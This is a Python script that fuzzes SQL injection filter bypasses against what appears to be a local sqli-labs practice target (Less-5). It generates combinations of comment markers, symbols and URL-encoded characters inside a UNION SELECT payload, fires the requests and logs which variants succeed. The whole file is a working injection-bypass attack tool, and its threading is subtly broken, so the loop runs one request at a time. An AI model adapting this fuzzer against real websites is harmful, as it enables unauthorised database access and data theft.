#encoding = utf8
import requests
from queue import Queue
import threading

fuzz_zs = ['/*','*/','/*!','*','=','`','!','@','%','.','-','+','|','%00']
fuzz_sz = ['',' ']
fuzz_ch = ["%0a","%0b","%0c","%0d","%0e","%0f","%0g","%0h","%0i","%0j"]
Fuzz=fuzz_ch+fuzz_sz+fuzz_zs
class fuzz:
    def __init__(self,root,ThreadNum=5):
        self.root="http://192.168.1.108/sqli/Less-5/?id=1"
        self.ThreadNum=5
        self.headers = {
             'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20',
             'Referer': 'http://www.camel.com',
             'Cookie': 'whoami=saulty4ish',
             }
        self.task =Queue()
        for a in Fuzz:
            for b in Fuzz:
                for c in Fuzz:
                    for d in Fuzz:
                        exp=self.root+"' /*!union"+a+b+c+d+"select*/"+" 1,2,3 --+"
                        self.task.put(exp)
        self.s_list = []
    
    def visit(self,url):
        try:
            r = requests.get(url,headers=self.headers)
            ret=r.text
        except:
            print ("Fail to connect...")
            ret=""
        return ret

    def test_url(self):
        while not self.task.empty():
            url = self.task.get()
            ret = self.visit(url)
            if "Dhakkan" in ret and not "error" in ret :
                self.s_list.append(url)
                print (url)
    
    def work(self):
        threads = []
        for i in range(self.ThreadNum):
            t = threading.Thread(target=self.test_url())
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
obj=fuzz("http://192.168.1.108/sqli/Less-5/?id=1")
obj.work()
